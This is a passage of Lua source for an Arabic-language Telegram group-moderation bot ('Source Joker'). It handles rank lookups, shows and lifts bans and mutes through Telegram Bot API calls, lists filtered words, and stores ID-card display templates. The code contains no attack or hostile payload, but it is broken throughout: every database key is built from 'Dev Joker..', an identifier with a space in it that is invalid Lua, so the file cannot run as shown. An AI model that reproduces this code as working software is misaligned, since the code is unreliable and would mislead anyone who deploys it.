Dev_Abs(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'مجموعه'
local grr = '⌁︙نوع الحساب ↫ ❨ '..gr..' ❩\n⌁︙الايدي ↫ ❨ '..res.id_..' ❩\n⌁︙المعرف ↫ ❨ [@'..username..'] ❩\n⌁︙الاسم ↫ ❨ ['..res.title_..'] ❩'
Dev_Abs(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
if tonumber(res.id_) == tonumber(1330377150) then
t = 'مبرمج السورس'
elseif tonumber(res.id_) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(res.id_) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:SudoBot:',res.id_) then
t = DevAbs:get(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevAbs:sismember(Dev Joker..'abs:absmonsh:'..msg.chat_id_,res.id_) then
t = 'منشئ المجموعة'
elseif DevAbs:sismember(Dev Joker..'abs:monsh:'..msg.chat_id_,res.id_) then
t = DevAbs:get(Dev Joker.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_,res.id_) then
t = DevAbs:get(Dev Joker.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_,res.id_) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_,res.id_) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevAbs:sismember(Dev Joker..'abs:vipall:',res.id_) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevAbs:sismember(Dev Joker..'abs:ownerall:',res.id_) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير عام'
elseif DevAbs:sismember(Dev Joker..'abs:adminall:',res.id_) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_,res.id_) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'عضو مميز'
else
t = DevAbs:get(Dev Joker.."abs:mem:Rd"..msg.chat_id_) or 'مجرد عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..res.id_) or 0
local msguser = tonumber(DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..res.id_))
local user_nkt = tonumber(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..res.id_) or 0)
if DevAbs:sismember(Dev Joker..'abs:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Dev Joker..'abs:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..res.id_..'` ❩\n⌁︙رتبته ↫ '..t..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgg(msguser)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
if tonumber(iduser) == tonumber(1330377150) then
t = 'مبرمج السورس'
elseif tonumber(iduser) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(iduser) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:SudoBot:',iduser) then
t = DevAbs:get(Dev Joker.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevAbs:sismember(Dev Joker..'abs:absmonsh:'..msg.chat_id_,iduser) then
t = 'منشئ المجموعة'
elseif DevAbs:sismember(Dev Joker..'abs:monsh:'..msg.chat_id_,iduser) then
t = DevAbs:get(Dev Joker.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_,iduser) then
t = DevAbs:get(Dev Joker.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_,iduser) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_,iduser) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevAbs:sismember(Dev Joker..'abs:vipall:',iduser) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevAbs:sismember(Dev Joker..'abs:ownerall:',iduser) then
t = DevAbs:get(Dev Joker.."abs:owners:Rd"..msg.chat_id_) or 'مدير عام'
elseif DevAbs:sismember(Dev Joker..'abs:adminall:',iduser) then
t = DevAbs:get(Dev Joker.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_,iduser) then
t = DevAbs:get(Dev Joker.."abs:vipmem:Rd"..msg.chat_id_) or 'عضو مميز'
else
t = DevAbs:get(Dev Joker.."abs:mem:Rd"..msg.chat_id_) or 'مجرد عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
return false  end
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..iduser) or 0
local msguser = tonumber(DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..iduser))
local user_nkt = tonumber(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..iduser) or 0)
if DevAbs:sismember(Dev Joker..'abs:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevAbs:sismember(Dev Joker..'abs:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if data.first_name_ == false then
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..iduser..')\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..t..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgg(msguser)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..t..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgg(msguser)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end
end,nil)
return false 
end 
--     Source Joker     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(Dev Joker..'abs:BanAll:',result.sender_user_id_) then BanAll = 'محظور عام' else BanAll = 'غير محظور عام' end
if DevAbs:sismember(Dev Joker..'abs:MuteAll:',result.sender_user_id_) then MuteAll = 'مكتوم عام' else MuteAll = 'غير مكتوم عام' end
if DevAbs:sismember(Dev Joker..'abs:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..BanAll..'\n⌁︙الكتم العام ↫ '..MuteAll..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقييد ↫ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevAbs:sismember(Dev Joker..'abs:BanAll:',result.id_) then BanAll = 'محظور عام' else BanAll = 'غير محظور عام' end
if DevAbs:sismember(Dev Joker..'abs:MuteAll:',result.id_) then MuteAll = 'مكتوم عام' else MuteAll = 'غير مكتوم عام' end
if DevAbs:sismember(Dev Joker..'abs:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..BanAll..'\n⌁︙الكتم العام ↫ '..MuteAll..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقييد ↫ '..tkeed..'', 1, 'md')  
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.sender_user_id_
},function(arg,data) 
if DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) or DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) or DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then 
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..result.sender_user_id_..') \n⌁︙تم رفع قيوده بنجاح \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_,result.sender_user_id_)   
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_,result.sender_user_id_)   
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
else
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..result.sender_user_id_..') \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end
end,nil)   
end 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = user
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لم استطع استخراج المعلومات* \n', 1, 'md') 
return false  end
if DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,user) or DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,user) or DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,user) then
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..user..') \n⌁︙تم رفع قيوده بنجاح \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_,user) 
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_,user)   
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_,user)   
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_,user) 
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_,user)   
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_,user)   
end
else
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..user..') \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
return false  end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*هذا معرف قناة وليس معرف حساب* \n', 1, 'md') 
return false  end
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.id_
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*لم استطع استخراج المعلومات* \n', 1, 'md') 
return false  end
if DevAbs:sismember(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.id_) or DevAbs:sismember(Dev Joker..'abs:Muted:'..msg.chat_id_,result.id_) or DevAbs:sismember(Dev Joker..'abs:Ban:'..msg.chat_id_,result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevAbs:srem(Dev Joker..'abs:Tkeed:'..msg.chat_id_,result.id_) 
DevAbs:srem(Dev Joker..'abs:Ban:'..msg.chat_id_,result.id_)   
DevAbs:srem(Dev Joker..'abs:Muted:'..msg.chat_id_,result.id_)   
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
--     Source Joker     --
if text and text:match("^قائمه المنع$") and ChCheck(msg) then
local abs = (Dev Joker..'bot:filters:'..msg.chat_id_)
if abs then
local names = DevAbs:hkeys(abs)
text = "⌁︙قائمة الكلمات الممنوعة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for i=1, #names do
text = text..'⌯ ❨ '..names[i]..' ❩\n'
end
if #names == 0 then
text = "⌁︙لا توجد كلمات ممنوعة"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
end
end
--     Source Joker     --
if text and text:match("^قائمه المنع العام$") and ChCheck(msg) or text and text:match("^قائمه الفلاتر العام$") and ChCheck(msg) or text and text:match("^قائمه المنع عام$") and ChCheck(msg) then
local abs = (Dev Joker..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs) 
text = '⌁︙قائمة المنع العام ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=1, #names do
text = text..'⌯ ❨ '..names[i]..' ❩\n'
end
if #names == 0 then
text = "⌁︙لا توجد كلمات ممنوعة عام "
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
--     Source Joker     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
⌁︙𝐔𝐒𝐄𝐑 ↬ #username 
⌁︙𝐈𝐃 ↬ #id
⌁︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
⌁︙𝐀𝐔𝐓𝐎 ↬ #cont 
⌁︙𝐌𝐀𝐒𝐆 ↬ #msgs
⌁︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]]}
local Text_Rand = List[math.random(#List)]
DevAbs:set("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_,Text_Rand)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
--     Source Joker     --
if is_leader(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشة تحتوي على النصوص التي باللغة الانجليزية ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n #username ↬ لطبع المعرف\n #id ↬ لطبع الايدي \n #photos ↬ لطبع عدد الصور \n #stast ↬ لطبع الرتب \n #msgs ↬ لطبع عدد الرسائل \n #msgday ↬ لطبع الرسائل اليوميه \n #formsg ↬ لطبع التفاعل \n #game ↬ لطبع عدد النقاط \n #cont ↬ لطبع عدد الجهات \n #sticker ↬ لطبع عدد الملصقات \n #edit ↬ لطبع عدد التعديلات \n #Description ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("Dev Joker:New:id:"..bot_id..msg.sender_user_id_,'ABS_PROX')
return "ABS_PROX"
end
if text and DevAbs:get("Dev Joker:New:id:"..bot_id..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("Dev Joker:New:id:"..bot_id..msg.sender_user_id_)
return false
end
DevAbs:del("Dev Joker:New:id:"..bot_id..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevAbs:set("Dev Joker:ABS_PROX:id:text:"..bot_id,text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف كليشة الايدي العامه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del("Dev Joker:ABS_PROX:id:text:"..bot_id)
end
end
--     Source Joker     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشة تحتوي على النصوص التي باللغة الانجليزية ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n #username ↬ لطبع المعرف\n #id ↬ لطبع الايدي \n #photos ↬ لطبع عدد الصور \n #stast ↬ لطبع الرتب \n #msgs ↬ لطبع عدد الرسائل \n #msgday ↬ لطبع الرسائل اليوميه \n #formsg ↬ لطبع التفاعل \n #game ↬ لطبع عدد النقاط \n #cont ↬ لطبع عدد الجهات \n #sticker ↬ لطبع عدد الملصقات \n #edit ↬ لطبع عدد التعديلات \n #Description ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevAbs:set("Dev Joker:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'ABS_PROX')
return "ABS_PROX"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("Dev Joker:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevAbs:del("Dev Joker:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
return false
end
DevAbs:del("Dev Joker:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الكليشة الجديدة', 1, 'md')
DevAbs:set("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del("Dev Joker:ABS_PROX:id:text:"..bot_id..msg.chat_id_)
end
end
--     Source Joker     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function ABS_PROX(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
local function getpro(extra, result, success) 
local ABS_PROX = DevAbs:get(Dev Joker..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local edit_msg = DevAbs:get(Dev Joker..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(DevAbs:get(Dev Joker.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
